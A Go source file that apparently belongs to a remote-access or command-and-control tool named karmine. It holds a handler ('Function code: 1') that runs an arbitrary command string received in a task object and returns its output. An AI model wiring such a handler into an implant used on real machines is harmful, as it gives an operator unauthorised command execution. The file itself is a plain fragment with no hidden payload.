// Function code: 1
package exec

import (
	"bytes"
	"fmt"
	"os/exec"
	"strings"

	"github.com/pygrum/karmine/models"
)

func Do(respObj *models.KarResponseObjectCmd, args ...models.MultiType) error {
	var rawCmd string
	var outb, errb bytes.Buffer
	rawCmd = args[0].StrValue
	fullCmd := strings.Split(rawCmd, " ")
	if len(fullCmd) < 1 {
		return fmt.Errorf("%d", 1)
	}
	app, appArgs := fullCmd[0], fullCmd[1:]
	cmd := exec.Command(app, appArgs...)
	cmd.Stdout = &outb
	cmd.Stderr = &errb
	err := cmd.Run()
	if err != nil {
		respObj.Data.Error = errb.String()
	}
	respObj.Data.Result = outb.String()
	return nil
}
